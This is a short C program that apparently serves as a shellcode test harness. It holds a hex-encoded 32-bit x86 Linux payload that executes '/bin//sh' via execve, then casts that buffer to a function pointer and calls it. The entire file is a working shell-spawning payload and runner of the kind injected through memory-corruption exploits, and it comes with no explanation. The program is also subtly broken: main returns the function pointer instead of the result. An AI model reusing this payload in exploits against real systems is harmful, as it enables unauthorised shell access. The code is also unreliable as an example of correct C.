
unsigned char code[] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char **argv)
{
    int fooval = 0;
    
    int (*foo)() = (int(*)())code;
    fooval = foo();
    return foo;
}
